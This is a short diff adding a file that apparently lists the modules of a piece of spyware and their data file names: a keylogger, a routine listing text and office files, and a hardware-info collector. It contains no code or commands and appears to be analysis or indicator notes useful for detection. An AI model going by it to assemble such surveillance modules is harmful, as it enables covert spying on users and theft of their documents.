@@ -1,0 +1,7 @@
+keylogger = TPX498.dat
+
+list txt, office file = edg499.dat
+
+
+get hardware info = 9PT568.dat
+
